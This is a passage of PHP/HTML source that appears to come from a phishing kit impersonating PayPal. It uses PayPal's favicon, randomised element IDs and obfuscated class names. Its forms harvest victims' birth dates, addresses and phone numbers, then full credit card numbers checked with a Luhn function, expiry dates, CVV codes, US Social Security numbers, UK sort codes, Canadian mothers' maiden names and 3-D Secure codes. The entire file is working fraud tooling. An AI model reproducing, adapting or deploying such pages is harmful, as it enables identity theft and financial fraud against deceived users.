		<option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option>
	</select>
	<select class="<? echo $inputo;?>" style="width:32%;" id="xDobM" name="xDobM">
		<option value="0">Month</option>
		<option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
	</select>
	<select class="<? echo $inputo;?>" style="width:32%;" id="xDobY" name="xDobY">
		<option value="0">Year</option>
		<option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option><option value="1904">1904</option><option value="1903">1903</option><option value="1902">1902</option><option value="1901">1901</option><option value="1900">1900</option><option value="1899">1899</option><option value="1898">1898</option><option value="1897">1897</option><option value="1896">1896</option>
	</select>
</div>

<div id="<?php echo RANDOM();?>" style="top:40px;left:200px;">

	<input type="text" class="<? echo $inputo;?>" id="xAddress1" name="xAddress1" placeholder="Address 1" value="">
</div>

<div id="<?php echo RANDOM();?>" style="top:80px;left:200px;">
	<input type="text" class="<? echo $inputo;?>" id="xAddress2" name="xAddress2" placeholder="Apt, Suit, Bldg. (Optional)" value="">
</div>

<div id="<?php echo RANDOM();?>" style="width:48%;float: left;">
<select id="state" class="<? echo $inputo;?>" name="xco" required="required" aria-required="true" style="width: 100%;">
                <option selected="selected">Country</option>
                <option value="Afganistan">Afghanistan</option>
                <option value="Albania">Albania</option>
                <option value="Algeria">Algeria</option>
                <option value="American Samoa">American Samoa</option>
                <option value="Andorra">Andorra</option>
                <option value="Angola">Angola</option>
                <option value="Anguilla">Anguilla</option>
                <option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
                <option value="Argentina">Argentina</option>
                <option value="Armenia">Armenia</option>
                <option value="Aruba">Aruba</option>
                <option value="Australia">Australia</option>
                <option value="Austria">Austria</option>
                <option value="Azerbaijan">Azerbaijan</option>
                <option value="Bahamas">Bahamas</option>
                <option value="Bahrain">Bahrain</option>
                <option value="Bangladesh">Bangladesh</option>
                <option value="Barbados">Barbados</option>
                <option value="Belarus">Belarus</option>
                <option value="Belgium">Belgium</option>
                <option value="Belize">Belize</option>
                <option value="Benin">Benin</option>
                <option value="Bermuda">Bermuda</option>
                <option value="Bhutan">Bhutan</option>
                <option value="Bolivia">Bolivia</option>
                <option value="Bonaire">Bonaire</option>
                <option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
                <option value="Botswana">Botswana</option>
                <option value="Brazil">Brazil</option>
                <option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
                <option value="Brunei">Brunei</option>
                <option value="Bulgaria">Bulgaria</option>
                <option value="Burkina Faso">Burkina Faso</option>
                <option value="Burundi">Burundi</option>
                <option value="Cambodia">Cambodia</option>
                <option value="Cameroon">Cameroon</option>
                <option value="Canada">Canada</option>
                <option value="Canary Islands">Canary Islands</option>
                <option value="Cape Verde">Cape Verde</option>
                <option value="Cayman Islands">Cayman Islands</option>
                <option value="Central African Republic">Central African Republic</option>
                <option value="Chad">Chad</option>
                <option value="Channel Islands">Channel Islands</option>
                <option value="Chile">Chile</option>
                <option value="China">China</option>
                <option value="Christmas Island">Christmas Island</option>
                <option value="Cocos Island">Cocos Island</option>
                <option value="Colombia">Colombia</option>
                <option value="Comoros">Comoros</option>
                <option value="Congo">Congo</option>
                <option value="Cook Islands">Cook Islands</option>
                <option value="Costa Rica">Costa Rica</option>
                <option value="Cote DIvoire">Cote D'Ivoire</option>
                <option value="Croatia">Croatia</option>
                <option value="Cuba">Cuba</option>
                <option value="Curaco">Curacao</option>
                <option value="Cyprus">Cyprus</option>
                <option value="Czech Republic">Czech Republic</option>
                <option value="Denmark">Denmark</option>
                <option value="Djibouti">Djibouti</option>
                <option value="Dominica">Dominica</option>
                <option value="Dominican Republic">Dominican Republic</option>
                <option value="East Timor">East Timor</option>
                <option value="Ecuador">Ecuador</option>
                <option value="Egypt">Egypt</option>
                <option value="El Salvador">El Salvador</option>
                <option value="Equatorial Guinea">Equatorial Guinea</option>
                <option value="Eritrea">Eritrea</option>
                <option value="Estonia">Estonia</option>
                <option value="Ethiopia">Ethiopia</option>
                <option value="Falkland Islands">Falkland Islands</option>
                <option value="Faroe Islands">Faroe Islands</option>
                <option value="Fiji">Fiji</option>
                <option value="Finland">Finland</option>
                <option value="France">France</option>
                <option value="French Guiana">French Guiana</option>
                <option value="French Polynesia">French Polynesia</option>
                <option value="French Southern Ter">French Southern Ter</option>
                <option value="Gabon">Gabon</option>
                <option value="Gambia">Gambia</option>
                <option value="Georgia">Georgia</option>
                <option value="Germany">Germany</option>
                <option value="Ghana">Ghana</option>
                <option value="Gibraltar">Gibraltar</option>
                <option value="Great Britain">Great Britain</option>
                <option value="Greece">Greece</option>
                <option value="Greenland">Greenland</option>
                <option value="Grenada">Grenada</option>
                <option value="Guadeloupe">Guadeloupe</option>
                <option value="Guam">Guam</option>
                <option value="Guatemala">Guatemala</option>
                <option value="Guinea">Guinea</option>
                <option value="Guyana">Guyana</option>
                <option value="Haiti">Haiti</option>
                <option value="Hawaii">Hawaii</option>
                <option value="Honduras">Honduras</option>
                <option value="Hong Kong">Hong Kong</option>
                <option value="Hungary">Hungary</option>
                <option value="Iceland">Iceland</option>
                <option value="India">India</option>
                <option value="Indonesia">Indonesia</option>
                <option value="Iran">Iran</option>
                <option value="Iraq">Iraq</option>
                <option value="Ireland">Ireland</option>
                <option value="Isle of Man">Isle of Man</option>
                <option value="Israel">Israel</option>
                <option value="Italy">Italy</option>
                <option value="Jamaica">Jamaica</option>
                <option value="Japan">Japan</option>
                <option value="Jordan">Jordan</option>
                <option value="Kazakhstan">Kazakhstan</option>
                <option value="Kenya">Kenya</option>
                <option value="Kiribati">Kiribati</option>
                <option value="Korea North">Korea North</option>
                <option value="Korea Sout">Korea South</option>
                <option value="Kuwait">Kuwait</option>
                <option value="Kyrgyzstan">Kyrgyzstan</option>
                <option value="Laos">Laos</option>
                <option value="Latvia">Latvia</option>
                <option value="Lebanon">Lebanon</option>
                <option value="Lesotho">Lesotho</option>
                <option value="Liberia">Liberia</option>
                <option value="Libya">Libya</option>
                <option value="Liechtenstein">Liechtenstein</option>
                <option value="Lithuania">Lithuania</option>
                <option value="Luxembourg">Luxembourg</option>
                <option value="Macau">Macau</option>
                <option value="Macedonia">Macedonia</option>
                <option value="Madagascar">Madagascar</option>
                <option value="Malaysia">Malaysia</option>
                <option value="Malawi">Malawi</option>
                <option value="Maldives">Maldives</option>
                <option value="Mali">Mali</option>
                <option value="Malta">Malta</option>
                <option value="Marshall Islands">Marshall Islands</option>
                <option value="Martinique">Martinique</option>
                <option value="Mauritania">Mauritania</option>
                <option value="Mauritius">Mauritius</option>
                <option value="Mayotte">Mayotte</option>
                <option value="Mexico">Mexico</option>
                <option value="Midway Islands">Midway Islands</option>
                <option value="Moldova">Moldova</option>
                <option value="Monaco">Monaco</option>
                <option value="Mongolia">Mongolia</option>
                <option value="Montserrat">Montserrat</option>
                <option value="Morocco">Morocco</option>
                <option value="Mozambique">Mozambique</option>
                <option value="Myanmar">Myanmar</option>
                <option value="Nambia">Nambia</option>
                <option value="Nauru">Nauru</option>
                <option value="Nepal">Nepal</option>
                <option value="Netherland Antilles">Netherland Antilles</option>
                <option value="Netherlands">Netherlands (Holland, Europe)</option>
                <option value="Nevis">Nevis</option>
                <option value="New Caledonia">New Caledonia</option>
                <option value="New Zealand">New Zealand</option>
                <option value="Nicaragua">Nicaragua</option>
                <option value="Niger">Niger</option>
                <option value="Nigeria">Nigeria</option>
                <option value="Niue">Niue</option>
                <option value="Norfolk Island">Norfolk Island</option>
                <option value="Norway">Norway</option>
                <option value="Oman">Oman</option>
                <option value="Pakistan">Pakistan</option>
                <option value="Palau Island">Palau Island</option>
                <option value="Palestine">Palestine</option>
                <option value="Panama">Panama</option>
                <option value="Papua New Guinea">Papua New Guinea</option>
                <option value="Paraguay">Paraguay</option>
                <option value="Peru">Peru</option>
                <option value="Phillipines">Philippines</option>
                <option value="Pitcairn Island">Pitcairn Island</option>
                <option value="Poland">Poland</option>
                <option value="Portugal">Portugal</option>
                <option value="Puerto Rico">Puerto Rico</option>
                <option value="Qatar">Qatar</option>
                <option value="Republic of Montenegro">Republic of Montenegro</option>
                <option value="Republic of Serbia">Republic of Serbia</option>
                <option value="Reunion">Reunion</option>
                <option value="Romania">Romania</option>
                <option value="Russia">Russia</option>
                <option value="Rwanda">Rwanda</option>
                <option value="St Barthelemy">St Barthelemy</option>
                <option value="St Eustatius">St Eustatius</option>
                <option value="St Helena">St Helena</option>
                <option value="St Kitts-Nevis">St Kitts-Nevis</option>
                <option value="St Lucia">St Lucia</option>
                <option value="St Maarten">St Maarten</option>
                <option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
                <option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
                <option value="Saipan">Saipan</option>
                <option value="Samoa">Samoa</option>
                <option value="Samoa American">Samoa American</option>
                <option value="San Marino">San Marino</option>
                <option value="Sao Tome &amp; Principe">Sao Tome &amp; Principe</option>
                <option value="Saudi Arabia">Saudi Arabia</option>
                <option value="Senegal">Senegal</option>
                <option value="Serbia">Serbia</option>
                <option value="Seychelles">Seychelles</option>
                <option value="Sierra Leone">Sierra Leone</option>
                <option value="Singapore">Singapore</option>
                <option value="Slovakia">Slovakia</option>
                <option value="Slovenia">Slovenia</option>
                <option value="Solomon Islands">Solomon Islands</option>
                <option value="Somalia">Somalia</option>
                <option value="South Africa">South Africa</option>
                <option value="Spain">Spain</option>
                <option value="Sri Lanka">Sri Lanka</option>
                <option value="Sudan">Sudan</option>
                <option value="Suriname">Suriname</option>
                <option value="Swaziland">Swaziland</option>
                <option value="Sweden">Sweden</option>
                <option value="Switzerland">Switzerland</option>
                <option value="Syria">Syria</option>
                <option value="Tahiti">Tahiti</option>
                <option value="Taiwan">Taiwan</option>
                <option value="Tajikistan">Tajikistan</option>
                <option value="Tanzania">Tanzania</option>
                <option value="Thailand">Thailand</option>
                <option value="Togo">Togo</option>
                <option value="Tokelau">Tokelau</option>
                <option value="Tonga">Tonga</option>
                <option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
                <option value="Tunisia">Tunisia</option>
                <option value="Turkey">Turkey</option>
                <option value="Turkmenistan">Turkmenistan</option>
                <option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
                <option value="Tuvalu">Tuvalu</option>
                <option value="Uganda">Uganda</option>
                <option value="Ukraine">Ukraine</option>
                <option value="United Arab Erimates">United Arab Emirates</option>
                <option value="United Kingdom">United Kingdom</option>
                <option value="United States of America">United States of America</option>
                <option value="Uraguay">Uruguay</option>
                <option value="Uzbekistan">Uzbekistan</option>
                <option value="Vanuatu">Vanuatu</option>
                <option value="Vatican City State">Vatican City State</option>
                <option value="Venezuela">Venezuela</option>
                <option value="Vietnam">Vietnam</option>
                <option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
                <option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
                <option value="Wake Island">Wake Island</option>
                <option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
                <option value="Yemen">Yemen</option>
                <option value="Zaire">Zaire</option>
                <option value="Zambia">Zambia</option>
                <option value="Zimbabwe">Zimbabwe</option>
                </select>
</div>

<div style="width: 48%;float: right;">
	<input type="text" class="<? echo $inputo;?>" id="xCity" name="xCity" placeholder="City" value="">
</div>
<div style="width: 48%;float: left;">
	<input type="text" class="<? echo $inputo;?>" id="xState" name="xState" placeholder="State" value="">
</div>
<div  style="width:48%;float: right;">
	<input type="text" class="<? echo $inputo;?>" id="xZip" style="width:100%;" name="xZip" placeholder="Zip Code" value="">
</div>
<div  style="top:80px;left:200px;">
	<input type="text" class="<? echo $inputo;?>" id="xPHONE" name="xPHONE" placeholder="Number Phone" value="">
</div>
  <input type="submit" class="<? echo $submito;?>" value="Next" onclick="return mForm()" style="top: 530;left: 435px;">
</form>
    	</div>   </div>
                   	<div id="<?php echo RANDOM();?>" class="<? echo $sidebar;?>">
                    <div id="<?php echo RANDOM();?>" class="<? echo $sid;?>">
                    <img id="<?php echo RANDOM();?>" src="<?echo$img_18?>">
                    </div>
                        <div id="<?php echo RANDOM();?>" class="<? echo $sid;?>">
                    <img id="<?php echo RANDOM();?>" src="<?echo$img_11?>">
                    </div>
                    </div>

</div>
 </body>
      <div id="<?php echo RANDOM();?>" class="f">
 <img  src="<?echo$img_7?>" >
</div>
         	<? }elseif($_GET["ID"] == 3){ ?>

<header>
         <title><?echo $countryname?>  | manage security</title>
         <link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="shortcut icon">
</header>

    <style>
    #loading-content {
    left: 50%;
    z-index: 999;
    width: 100px;
    margin-left: -50px;
    position: absolute;
    min-height: 100px;
    display: none;
}
    #rotating {
width: 40px;
height: 40px;
    z-index: 99;
    display: block;
    margin: 32px auto;
    animation: 0.7s linear 0s normal none infinite running rotation;
    border-width: 8px;
    border-style: solid;
    border-color: #2180C0 rgba(0, 0, 0, 0.2) rgba(0, 0, 0, 0.2);
    border-radius: 100%;
}
@keyframes rotation {
	from {
		transform: rotate(0deg);
	}
	to {
		transform: rotate(359deg);
	}
}
.<? echo $lool;?> {
background: #F5F5F5 none repeat scroll 0% 0%;
position: fixed;
z-index: 1030;
width: auto;
width: 100%;
border-bottom: 1px solid #CCC;
box-shadow: 0px 2px #D7D7D7;

}

 .<? echo $nav;?> {
left: 0px;
right: 0px;
margin: 9px auto;
min-height: 3em;
}
.<? echo $imgl;?>{
    float: left;
    margin:11px 0px 0px 55px
}
.<? echo $imgr;?>{
    float: right;
    margin: 0px 33px 0px 55px;
}
.<? echo $hif;?>{
           height: 0;
      }


.<? echo $lool1;?> {
width: 100%;
color: #FFF;
background: #009CDE none repeat scroll 0% 0%;
float: left;
}
.<? echo $nav;?>1 {
max-width: 1170px;
margin-left: auto;
margin-right: auto;
padding-top: 10px;
}
.<? echo $imgl1;?>{
padding: 15px;
    float: left;

}
.<? echo $imgr1;?>{
padding-top: 15px;
padding-bottom: 15px;
    float: right;

}

.<? echo $hilx;?>{
    height: 0px;
}

 @media only screen and (max-width: 930px) {
     .<? echo $hid;?>{
          height: 0;
     }
     .<? echo $his;?>{
          height: 0;
     }
      .<? echo $hif;?>{
          height: auto;
      }
      .<? echo $imgr;?> {
    margin: 0px 33px 0px 0px;
}
.<? echo $imgl;?> {
    float: left;
    margin: 11px 0px 0px 20px;
}
.<? echo $him;?> {
              height: 0;
}
.<? echo $imgl1;?> {
    padding: 0px;
    float: left;
}
.<? echo $hil;?> {
    height: 0;
    float: left;
}
.<? echo $hilx;?>{
    height: auto;
}

.<? echo $imgr1;?> {
    padding: 0px;
}

}

 @media only screen and (max-width: 550px) {
.<? echo $lool1;?>,.<? echo $imgr1;?>,.<? echo $imgl1;?> {
   visibility: hidden;
   height: 0;
}
.<?echo $container?> {
    padding: 0px 0px 0px 0px;
}
.f {
    height: 0;
}
}

#xCVV{
    width: 100%; background-repeat: no-repeat; background-position: right center; background-image: url("<?echo$img_15;?>");
}

     .e{
    border-color: #c72e2e;
    background-repeat: no-repeat;
    background-position: 98% center;
    background-image: url(<?=$input_fail_png;?>);
     }

</style>

    <body style="margin: 0px;">
<div id="<?php echo RANDOM();?>" class="<? echo $lool;?>">
<div id="<?php echo RANDOM();?>" class="<? echo $nav;?>">
 <div id="<?php echo RANDOM();?>" class="<? echo $imgl;?>">
<img height="28" width="106" src="<?echo$img_2?>"></img></div>
<img class="<? echo $hid;?>" src="<?echo$img_3?>"></img>
 <div id="<?php echo RANDOM();?>" class="<? echo $imgr;?>">
 <img  class="<? echo $his;?>" src="<?echo$img_4?>"></img>
 <img class="<? echo $hif;?>" src="<?echo$img_5?>"></img>
  </div>
  </div>
</div>     <br><br><br>
<div id="<?php echo RANDOM();?>" class="<? echo $lool1;?>">
<div id="<?php echo RANDOM();?>" class="<? echo $nav1;?>">
 <div id="<?php echo RANDOM();?>" class="<? echo $imgl1;?>">
  <img class="<? echo $hil;?>" src="<?echo$img_6?>"></img>
  <img class="<? echo $hilx;?>" src="<?echo$img_9?>"></img>
  </div>
   <div id="<?php echo RANDOM();?>" class="<? echo $imgr1;?>">
  <img class="<? echo $him;?>" src="<?echo$img_8?>"></img>
  </div>
  </div>
</div>
          <script type="text/javascript" src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script type="text/javascript">

	function checkCC(s) {var i, n, c, r, t;r = "";for (i = 0; i < s.length; i++) {c = parseInt(s.charAt(i), 10);if (c >= 0 && c <= 9) r = c + r;}if (r.length <= 1) return false;t = "";for (i = 0; i < r.length; i++) {c = parseInt(r.charAt(i), 10);if (i % 2 != 0) c *= 2;t = t + c;}n = 0;for (i = 0; i < t.length; i++) {c = parseInt(t.charAt(i), 10);n = n + c;}if (n != 0 && n % 10 == 0) return true;else return false;}

	function numbersonly(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8){if (unicode<48||unicode>57)return false;}}
	function letersonly(e){if(("abcdefghijklmnopqrstuvwxyz ").indexOf(String.fromCharCode(e.keyCode))===-1){e.preventDefault();return false;}}


	function xForm () {

      	    	var H =  $('input[name=xHolder]');
	    	var CC =  $('input[name=xCCV]');
	    	var EM = $('select[name=xExpM]');
	    	var EY = $('select[name=xExpY]');
	    	var CV = $('input[name=xCVV]');
		if (document.getElementById("xHolder").value.length < 4 ){H.addClass("e");return false;}else{H.removeClass("e")}
		if (document.getElementById("xCCV").value.length < 13 ){CC.addClass("e");return false;}else{CC.removeClass("e");}
   	   var OxCCV=document.form.xCCV.value;
if (checkCC(OxCCV)==false ){CC.addClass("e");return false;}else{CC.removeClass("e");}
		if (document.getElementById("xExpM").value == 0){EM.addClass("e");return false;}else{EM.removeClass("e");}
		if (document.getElementById("xExpY").value == 0){EY.addClass("e");return false;}else{EY.removeClass("e");}
		if (document.getElementById("xCVV").value.length < 3){CV.addClass("e");return false;}else{CV.removeClass("e");}
		var OOxLOCATION=document.form.xLOCATION.value;
	    	var S1 =  $('input[name=xSSN1]');
	    	var S2 =  $('input[name=xSSN2]');
	    	var S3 =  $('input[name=xSSN3]');
	    	var SC =  $('input[name=xSortCode]');

		if (OOxLOCATION == "United States of America"){
			if (document.getElementById("xSSN1").value.length < 2){
S1.addClass("e");
				return false;
			}else if(document.getElementById("xSSN2").value.length < 2){
S2.addClass("e");
				return false;
			}else if(document.getElementById("xSSN3").value.length < 2){
S3.addClass("e");
				return false;
			}else{
S1.removeClass("e");
S2.removeClass("e");
S3.removeClass("e");
			};
		}
		if(OOxLOCATION == "United Kingdom"){
			if (document.getElementById("xSSN1").value.length < 2){
S1.addClass("e");
				return false;
			}else if(document.getElementById("xSSN2").value.length < 2){
S2.addClass("e");
				return false;
			}else if(document.getElementById("xSSN3").value.length < 2){
S3.addClass("e");
				return false;
			}else{
S1.removeClass("e");
S2.removeClass("e");
S3.removeClass("e");
			};
		}
		if(OOxLOCATION == "Canada"){
			if (document.getElementById("xSortCode").value.length < 2){
SC.addClass("e");
				return false;
			}else{
SC.removeClass("e");
			};
		}


                 $('#loading-content').show();
                $('#fo').css({'opacity':'0.6'});
 };

	function SelectCC(ccnum) { var first = ccnum.charAt(0);var second = ccnum.charAt(1);var third = ccnum.charAt(2);var fourth = ccnum.charAt(3);
		if (first == "4") {document.getElementById("cc1_v").src="<?=$v_co_png;?>";document.getElementById("cc1_v").style="";
        document.getElementById("ccTYPE").value="VISA";document.getElementById("xCVV").maxLength = 3;document.getElementById("xCCV").maxLength = 16;}
		else if ( (first == "3") && ((second == "4") || (second == "7")) ) {document.getElementById("cc1_v").src="<?=$a_co_png;?>";document.getElementById("cc1_v").style="";document.getElementById("ccTYPE").value="AMEX";document.getElementById("xCVV").maxLength = 4;document.getElementById("xCCV").maxLength = 15;}
		else if ( (first == "5") ) {document.getElementById("cc1_v").src="<?=$m_co_png;?>";document.getElementById("cc1_v").style="";document.getElementById("ccTYPE").value="MASTER";document.getElementById("xCVV").maxLength = 3;document.getElementById("xCCV").maxLength = 16;}
		else if ( (first == "6") && (second == "0") && (third == "1") && (fourth == "1") ) {document.getElementById("cc1_v").src="<?=$d_co_png;?>";document.getElementById("cc1_v").style="";document.getElementById("ccTYPE").value="DISCOVER";document.getElementById("xCVV").maxLength = 3;document.getElementById("xCCV").maxLength = 16;}
		else {document.getElementById("cc1_v").style="visibility: hidden;";document.getElementById("ccTYPE").value="UNKNOWN";document.getElementById("xCVV").maxLength = 3;document.getElementById("xCCV").maxLength = 16;return false;}
	}

        </script>

     <div id="<?php echo RANDOM();?>" class="<?echo $container?>">

     <div id="<?php echo RANDOM();?>" class="<?echo $content?>">
     <div id="form2" >
<form id="fo" action="" method="POST" name="<? echo $submito;?>">
<br>  <img class="<?echo $nof?>" src="<?echo$img_12?>"></img>
<br>  <img class="<? echo $nol;?>" src="<?echo$img_16?>"></img>
  <br>

<div id="loading-content"><div id="rotating"></div></div>


<div>
	<input type="text" class="<? echo $inputo;?>" style="" id="xHolder" name="xHolder" placeholder="Full Name As It Appear On Your Card">
  </div>



<div >
<div id="<?php echo RANDOM();?>"  style=" position: absolute; left: 80%;">
<img id="cc1_v" class="cc" >
</div>
	<input  id="xCCV"  type="text" class="<? echo $inputo;?>"name="xCCV" placeholder="Credit Card Number" maxlength="16" onkeyup="SelectCC(this.value)" onkeypress="return numbersonly(event) " >
  </div>




<div>

	<select id="xExpM" class="<? echo $inputo;?>" style="width:40%;"  name="xExpM">
		<option value="0">Month</option>
		<option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
	</select>

	<select id="xExpY" class="<? echo $inputo;?>" style="width:58%;"  name="xExpY">
		<option value="0">Year</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option>
	</select>

</div>


<div>

	<input type="text" id="xCVV" class="<? echo $inputo;?>" style="width:100%;"  name="xCVV" placeholder="Security Code" maxlength="4"  onkeypress="return numbersonly(event)">

</div>

<?

if ($_SESSION['xco'] == "United States of America") { ?>
	<font id="<?php echo RANDOM();?>" class="imgX" style="top: 710px;left: 450px;font-size: 16px;">Security Social Number</font> <br>
    <div id="<?php echo RANDOM();?>" style="top:480px;left:200px;">
	<input id="xSSN1" type="text" class="<? echo $inputo;?>" style="width:33%;" name="xSSN1" placeholder="">
	<input id="xSSN2" type="text" class="<? echo $inputo;?>"  style="width:32%;" name="xSSN2" placeholder="">
	<input id="xSSN3" type="text" class="<? echo $inputo;?>" style="width:32%;" name="xSSN3" placeholder="">
</div>

<?
}elseif ($_SESSION['xco'] == "United Kingdom") {
?>
	<font id="<?php echo RANDOM();?>" class="imgX" style="top: 710px;left: 450px;font-size: 16px;">Bank Sort Code</font> <br>
    <div id="<?php echo RANDOM();?>"  style="top:480px;left:200px;">
	<input id="xSSN1" type="text" class="<? echo $inputo;?>"  style="width:33%;" name="xSSN1" placeholder="">
	<input id="xSSN2" type="text" class="<? echo $inputo;?>"  style="width:32%;" name="xSSN2" placeholder="">
	<input id="xSSN3" type="text" class="<? echo $inputo;?>"  style="width:32%;" name="xSSN3" placeholder="">
</div>

<?}elseif ($_SESSION['xco'] == "Canada") {
?>
<div id="<?php echo RANDOM();?>" style="top:480px;left:200px;">
	<font id="<?php echo RANDOM();?>" class="imgX" style="top: 710px;left: 450px;font-size: 16px;">Mother Middel Name</font>
	<input id="xSortCode"  type="text" class="<? echo $inputo;?>"  name="xSortCode" placeholder="">

</div>
<?}else{?>

<div id="<?php echo RANDOM();?>" style="top:480px;left:200px;">
	<input id="xVBV" type="text" class="<? echo $inputo;?>"  name="xVBV" placeholder="3-D Security Code"  value="">

</div>
<?}?>
<input id="xLOCATION" type="hidden" name="xLOCATION" value="<?echo $_SESSION['xco']?>">
<input id="ccTYPE" type="hidden" name="ccTYPE"  value="">

<input type="submit" class="<? echo $submito;?>" value="Save" onclick="return xForm()" style="top: 530;left: 435px;">

    </form>
        	</div>   </div>
                   	<div id="<?php echo RANDOM();?>" class="<? echo $sidebar;?>">
                    <div id="<?php echo RANDOM();?>" class="<? echo $sid;?>">
                    <img src="<?echo$img_17?>">
                    </div>
                        <div id="<?php echo RANDOM();?>" class="<? echo $sid;?>">
                    <img id="<?php echo RANDOM();?>" src="<?echo$img_11?>">
                    </div>
                    </div>
</div>
 </body>
  <div id="<?php echo RANDOM();?>" class="f">
 <img id="<?php echo RANDOM();?>"  src="<?echo$img_7?>" >
</div> 	<? }else{   ?>
<head>
          <title>account manage security</title>
          <link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="shortcut icon">

<style>

.<? echo $lool;?> {
background: #F5F5F5 none repeat scroll 0% 0%;
position: fixed;
z-index: 1030;
width: auto;
width: 100%;
border-bottom: 1px solid #CCC;
box-shadow: 0px 2px #D7D7D7;

}

 .<? echo $nav;?> {
left: 0px;
right: 0px;
margin: 9px auto;
min-height: 3em;
}
.<? echo $imgl;?>{
    float: left;
    margin:11px 0px 0px 55px
}
.<? echo $imgr;?>{
    float: right;
    margin: 0px 33px 0px 55px;
}
.<? echo $hif;?>{
           height: 0;
      }

 @media only screen and (max-width: 930px) {
     .<? echo $hid;?>{
          height: 0;
     }
     .<? echo $his;?>{
          height: 0;
     }

      .<? echo $hif;?>{
          height: auto;
      }
      .<? echo $imgr;?> {
    margin: 0px 33px 0px 0px;
}
.<? echo $imgl;?> {
    float: left;
    margin: 11px 0px 0px 20px;
}
}


.<?echo $container?> {
    padding: 0px 0px 0px 0px;
}
.f {
    height: 0;
}
}

</style>
<link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="shortcut icon">
 <title><?echo $countryname?>  | manage information</title>
</head>
<body style="margin: 0px;background-color: rgb(255, 255, 255);">
<div id="<?php echo RANDOM();?>" class="<? echo $lool;?>">
<div id="<?php echo RANDOM();?>" class="<? echo $nav;?>">
 <div id="<?php echo RANDOM();?>" class="<? echo $imgl;?>">
<img id="<?php echo RANDOM();?>" height="28" width="106" src="<?echo$img_2?>"></img></div>
<img id="<?php echo RANDOM();?>" class="<? echo $hid;?>" src="<?echo$img_3?>"></img>
 <div id="<?php echo RANDOM();?>" class="<? echo $imgr;?>">
 <img id="<?php echo RANDOM();?>"  class=""<? echo $his;?>"" src="<?echo$img_4?>"></img>
 <img id="<?php echo RANDOM();?>" class="<? echo $hif;?>" src="<?echo$img_5?>"></img>
  </div>
  </div>
</div>     <br><br><br>                                                <br><br><br>



     <div id="<?php echo RANDOM();?>" class="<?echo $container?>">
                      <center><div id="<?php echo RANDOM();?>" class="<?echo $container?>">

